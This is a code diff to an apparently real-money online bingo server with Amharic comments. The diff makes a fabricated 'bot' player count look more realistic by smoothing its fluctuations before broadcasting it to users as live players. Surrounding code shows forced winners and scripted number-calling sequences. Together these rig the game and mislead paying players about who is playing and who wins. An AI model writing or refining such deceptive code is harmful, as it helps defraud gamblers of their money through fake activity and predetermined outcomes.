@@ -44,7 +44,7 @@ const ETHIOPIAN_BOT_NAMES = [
     "Fiyorina", "Kirra", "Bilal", "Pilatos", "Merlin",
     "Osmehin", "Denver", "Belew", "Jilalu", "Gizachew Kassahun",
     "bereket dagne", "Mesfin", "ሞለፍን ኔትስት ገበየሁ", "Birukte#🦋", "🦋Meklit🦋",
-    "Abel x", "Farhewot Yashtla", "🅖ⓞⓞッド🌹", "YO", "እያሱ",
+    "Abel x", "Farhewot Yashtla", "🅖ⓞⓞⓓ🌹", "YO", "እያሱ",
     "Goyta Miraw ጣምራው", "0919091129", "Gdg", "Lai", "Sintayehu Getachew",
     "Pipo Kassa", "ገብርኤል አባቴ", "Yohannes Ng", "Gech man", "Devido ✝",
     "Seydou Kamite", "Mamush Kasim Mucaa Kakuuuu", "Aman yi", "Ahmed Basher",
@@ -187,41 +187,58 @@ function getWinningMatchedIndices(winningCardNumbers, calledNumbers) {
     return fallbackMatched;
 }
 
-// 🕒 የኢትዮጵያ ሰዓት አቆጣጠር ሎጂክ (Base Count) + የቀጥታ ፍሎት ማስተካከያ
-function getRealisticBotsCount(realCount) {
+// 🕒 የኢትዮጵያ ሰዓት አቆጣጠር መሠረት (Base Count) + በካርድ መምረጫው ላይ ብቻ የሚሰራ ለስላሳ ሎጂክ (±1 እስከ ±5)
+let lastSmoothCount = 95; 
+
+function getRealisticBotsCount(realCount, isGameActive = false) {
     const now = new Date();
     let utcHours = now.getUTCHours();
     let utcMinutes = now.getUTCMinutes();
     let ethiopianHour = (utcHours + 3) % 24; 
     let totalMinutesFrom16 = ((ethiopianHour - 16 + 24) % 24) * 60 + utcMinutes;
     let maxDurationMinutes = 8 * 60;
-    let calculated = 95;
+    let targetBase = 95;
 
     if (ethiopianHour >= 6 && ethiopianHour < 12) {
-        calculated = 45 + Math.floor(Math.random() * 15);
+        targetBase = 50 + Math.floor(Math.random() * 10);
     } else if (ethiopianHour >= 12 && ethiopianHour < 19) {
-        calculated = 70 + Math.floor(Math.random() * 20);
+        targetBase = 80 + Math.floor(Math.random() * 15);
     } else {
         let progress = Math.min(1, Math.max(0, totalMinutesFrom16 / maxDurationMinutes));
-        calculated = Math.floor(100 + (progress * 130) + (Math.sin(Date.now() / 3000) * 15));
+        targetBase = Math.floor(100 + (progress * 100));
     }
 
-    // 🔀 ከ 1 እስከ 5 ያሉ ሰዎች ገባ/ወጣ እያሉ የቀጥታ ስሜት እንዲፈጥሩ
-    let randomDelta = Math.floor(Math.random() * 5) + 1; 
-    let sign = Math.random() < 0.5 ? 1 : -1; 
-    let finalCount = calculated + (randomDelta * sign);
+    // 🛑 ጨዋታው (Game) ከተጀመረ ፍሎቱ (Fluctuation) ቆሞ ትክክለኛውን የሰዓት ታርጌት ብቻ ይዞ ይቆማል!
+    if (isGameActive) {
+        lastSmoothCount = targetBase;
+    } else {
+        // በካርድ መምረጫው (Lobby / Card Selection) ላይ እያሉ ብቻ በ ±1 እስከ ±5 ለስላሳ ለውጥ ያሳያል
+        let step = Math.floor(Math.random() * 5) + 1; 
+        if (lastSmoothCount < targetBase) {
+            lastSmoothCount += step;
+            if (lastSmoothCount > targetBase) lastSmoothCount = targetBase;
+        } else if (lastSmoothCount > targetBase) {
+            lastSmoothCount -= step;
+            if (lastSmoothCount < targetBase) lastSmoothCount = targetBase;
+        } else {
+            let minorDelta = (Math.floor(Math.random() * 3) + 1) * (Math.random() < 0.5 ? 1 : -1);
+            lastSmoothCount += minorDelta;
+        }
+    }
 
-    if (finalCount < 40) finalCount = 40;
-    if (finalCount > 250) finalCount = 250;
-    return finalCount;
+    if (lastSmoothCount < 40) lastSmoothCount = 40;
+    if (lastSmoothCount > 250) lastSmoothCount = 250;
+
+    return lastSmoothCount;
 }
 
-// 🔄 ተጠቃሚዎች ገና ቁጥር መምረጫው ላይ እያሉ በየ 4 ሰከንዱ ተጫዋቾች ገባ/ወጣ እያሉ አፕዴት የሚያደርግ Loop
+// 🔄 ተጠቃሚዎች ቁጥር መምረጫው (Game Inactive) ላይ እያሉ ብቻ በየ 4 ሰከንዱ የሚለዋወጥ ሉፕ
 setInterval(() => {
-    let realCount = connectedRealPlayers.length;
-    globalRoom.playersCount = getRealisticBotsCount(realCount) + realCount;
-    // ለሁሉም ተጠቃሚዎች (ካርድ መምረጫ ላይ ላሉትም ጭምር) የቀጥታ የተጫዋቾች ቁጥር ስራጭ
-    io.emit('updatePlayersCount', globalRoom.playersCount);
+    if (!globalRoom.gameActive) {
+        let realCount = connectedRealPlayers.length;
+        globalRoom.playersCount = getRealisticBotsCount(realCount, false) + realCount;
+        io.emit('updatePlayersCount', globalRoom.playersCount);
+    }
 }, 4000);
 
 function refreshTakenCardsList() {
@@ -277,6 +294,11 @@ function startMainGameLoop() {
             globalRoom.calledNumbers = [];
             globalRoom.lastCalledNumber = null;
             
+            // 🛑 ጨዋታው ሲጀመር (Game Board ውስጥ ሲገቡ) የሰዓቱን ትክክለኛ ቁጥር ይዞ ይቆማል (Fluctuation ይቆማል)
+            let realCount = connectedRealPlayers.length;
+            globalRoom.playersCount = getRealisticBotsCount(realCount, true) + realCount;
+            io.emit('updatePlayersCount', globalRoom.playersCount);
+
             let activeRealEntries = Object.entries(globalRoom.playerRoundCards).filter(([socketId, data]) => data.cards && data.cards.length > 0);
             let currentWinnerType = forcedNextWinner;
             forcedNextWinner = null; 
@@ -327,11 +349,9 @@ function startMainGameLoop() {
             winnersCount = winningUsernamesArr.length;
             globalRoom.forcedWinningCardNums = winningCardNums;
             
-            // 🔄 ዋናዎቹ ቁጥሮች በቅደም ተከተል ሉፕ እያደረጉ ይወጣሉ
             let targetCallCount = customNumberFlowSequence[sequenceIndex];
             sequenceIndex = (sequenceIndex + 1) % customNumberFlowSequence.length;
 
-            // 🌟 አልፎ አልፎ (Rare) ከብዙ ጌም አንዴ የ rareRotationPool ቁጥሮች እንዲተኩ ይደረጋል
             if (Math.random() < 0.15) { 
                 targetCallCount = rareRotationPool[Math.floor(Math.random() * rareRotationPool.length)];
             }
@@ -611,7 +631,7 @@ async function sendAdminFinancialRequest(requestId, type, amount, username, user
 io.on('connection', (socket) => {
     connectedRealPlayers.push(socket.id);
     let realCount = connectedRealPlayers.length;
-    let currentBotsCount = getRealisticBotsCount(realCount);
+    let currentBotsCount = getRealisticBotsCount(realCount, globalRoom.gameActive);
     globalRoom.playersCount = currentBotsCount + realCount; 
     io.emit('updatePlayersCount', globalRoom.playersCount);
     socket.emit('syncGameState', globalRoom);
@@ -688,7 +708,7 @@ io.on('connection', (socket) => {
         };
 
         await sendAdminFinancialRequest(requestId, type, amount, username, userId, currentBalance, phone, receipt);
-        socket.emit('requestSubmitted', { success: true, message: "✅ ጥያቄዎ ለአድሚን ተልቋል!" });
+        socket.emit('requestSubmitted', { success: true, message: "✅ ጥያቄዎ ለአድሚን ተልኳል!" });
     });
 
     socket.on('disconnect', () => {
@@ -698,7 +718,7 @@ io.on('connection', (socket) => {
         delete globalRoom.playerTemporaryCards[socket.id];
         refreshTakenCardsList();
         let realCount = connectedRealPlayers.length;
-        globalRoom.playersCount = getRealisticBotsCount(realCount) + realCount;
+        globalRoom.playersCount = getRealisticBotsCount(realCount, globalRoom.gameActive) + realCount;
         io.emit('updatePlayersCount', globalRoom.playersCount);
     });
 });
